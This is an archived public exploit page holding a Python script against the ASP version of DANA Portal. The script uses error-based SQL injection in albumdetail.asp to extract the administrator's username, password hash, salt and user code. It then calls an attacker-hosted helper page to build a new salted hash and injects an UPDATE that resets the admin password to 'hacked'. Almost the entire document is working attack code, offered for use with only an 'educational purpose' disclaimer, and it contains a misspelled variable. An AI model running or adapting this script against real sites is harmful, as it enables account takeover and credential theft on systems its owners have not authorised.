<html><head><title>Dana Portal Remote Change Admin Password Exploit</title></head><pre>#!/usr/bin/python
# Abysssec Inc Public Exploit Code
# Title  : Dana Portal Remote Change Admin Password Exploit
# Affected Version : ASP Version
# Vulnerable File : albumdetail.asp
# Vendor  Site   : www.dana.ir

# note :  no point to keep it private anymore .
# This exploit ueses of sql injection vulnerability exist in DANA Portal asp version 
# the &quot;real&quot; problem is when you extract SHA1 hash , hash is not clear and is SHA1+Salt
# The alghorithm is not really hard to break and writing cracker tool but i prefered 
# To update admin password (SH1 + Salt ) with &quot;hacked&quot; word . 
# this exploit is just for educational purpose and author will  be not be responsible for any damage using this exploit .
# feel free to contact me at : admin [at] abysssec.com 

# for working  with this exploit you need two asp file for updating hash you can download both from : 
# www.abysssec.com/files/dana.zip
# www.milw0rm.com/sploits/2009-dana.zip

# then need to upload asp files and change  this &quot;http://wwww.yourasphost.com/salt.asp?salt=&quot;  in exploit code

import string
import urllib
import sys
import re

def Abysssec():
        print &quot;\n&quot;
        print &quot;#####################################################&quot;
        print &quot;#     DanaPortal Remote Change Password Exploit     #&quot;
        print &quot;#              	 www.Abysssec.com              	   #&quot;
        print &quot;#####################################################&quot;
        print &quot;\n&quot;



#Call Banner
Abysssec()

print &quot;\n[+] Target Host: e.g: http://site.com/danaportal/&quot;
try:
        host=raw_input(&quot;\nTarget Host : &quot;)
except KeyboardInterrupt:
        print &quot;\n[-] Program Terminated&quot;
        sys.exit()


print &quot;\n[+] Trying  To Connect ...\n&quot;

# Check Http in string
if host[:7] == &quot;http://&quot;:
        pass
else:
        host = &quot;http://&quot;+host

        
#SQL Injection URL
sql_inject=host+&quot;/albumdetail.asp?Gid=1+or+1=(select+top+1+username+from+tblAuthor)--&quot;

response = urllib.urlopen(sql_inject).read()

print &quot;[+] Trying  To Inject Code ...\n&quot;

#Extract Admin User
findall_users=re.compile('&lt;font face=&quot;Arial&quot; size=2&gt;Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.&lt;/font&gt;').findall
found_users=findall_users(response)

#check found user length
if len(found_ussers)==0:
    print &quot;[-] Exploit Failed, Maybe Your Target Is Not Vulnerable &quot;
    sys.exit()
        

print &quot;\n[+] Admin User :  &quot;,found_users[0]

# Extract Admin Hash
hash_inject = host+&quot;/albumdetail.asp?Gid=1+or+1=(select+top+1+password+from+tblAuthor+where+username+in+('&quot;+found_users[0]+&quot;'))--&quot;
response = urllib.urlopen(hash_inject).read()
findall_hashs=re.compile('&lt;font face=&quot;Arial&quot; size=2&gt;Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.&lt;/font&gt;').findall
found_hashs=findall_hashs(response)
if len(found_hashs)==0:
    print &quot;[-] Exploit Failed, Maybe Your Target Is Not Vulnerable &quot;
    sys.exit()
    
print &quot;\n[+] Admin Hash :  &quot;,found_hashs[0]

# Extract Admin Salt
salt_inject = host+&quot;/albumdetail.asp?Gid=1+or+1=(select+top+1+salt+from+tblAuthor+where+username+in+('&quot;+found_users[0]+&quot;'))--&quot;
response = urllib.urlopen(salt_inject).read()
findall_salt=re.compile('&lt;font face=&quot;Arial&quot; size=2&gt;Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.&lt;/font&gt;').findall
found_salt=findall_salt(response)
if len(found_salt)==0:
    print &quot;[-] Exploit Failed, Maybe Your Target Is Not Vulnerable &quot;
    sys.exit()    
print &quot;\n[+] Admin Salt :  &quot;,found_salt[0]


# Extract User Code
usercode_inject = host+&quot;/albumdetail.asp?Gid=1+or+1=(select+top+1+user_code+from+tblAuthor+where+username+in+('&quot;+found_users[0]+&quot;'))--&quot;
response = urllib.urlopen(usercode_inject).read()
findall_usercode=re.compile('&lt;font face=&quot;Arial&quot; size=2&gt;Conversion failed when converting the nvarchar value \'(\w+)\' to data type int.&lt;/font&gt;').findall
found_usercode=findall_usercode(response)
if len(found_usercode)==0:
    print &quot;[-] Exploit Failed, Maybe Your Target Is Not Vulnerable &quot;
    sys.exit()
    
print &quot;\n[+] Admin Code :  &quot;,found_usercode[0]

# Generate New Hash + Salt
update_password = &quot;http://wwww.yourasphost.com/salt.asp?salt=&quot;+found_salt[0] # change this url with yours !
response = urllib.urlopen(update_password).read()
findall_update=re.compile('(\w+)&lt;/object&gt;').findall

found_update=findall_update(response)

updated_hash = ''.join(found_update)

# Update Password
usercode_inject = host+&quot;/albumdetail.asp?Gid=-1+UPDATE+tblauthor+SET+password='&quot;+updated_hash+&quot;'+where+username='&quot;+found_users[0]+&quot;'--&quot;

response = urllib.urlopen(usercode_inject).read()

if len(response) == 0:
        print &quot;[-] Exploit Failed, Maybe Your Target Is Not Vulnerable &quot;
        sys.exit()
else:
        print &quot;[+] Updated Successfully \n&quot;
        print &quot;[+] Login Url : &quot;+host+&quot;/manage&quot;
        print &quot;[+] Username  : &quot;+found_users[0]
        print &quot;[+] Password  : hacked&quot;

# milw0rm.com [2009-05-18]</pre></html>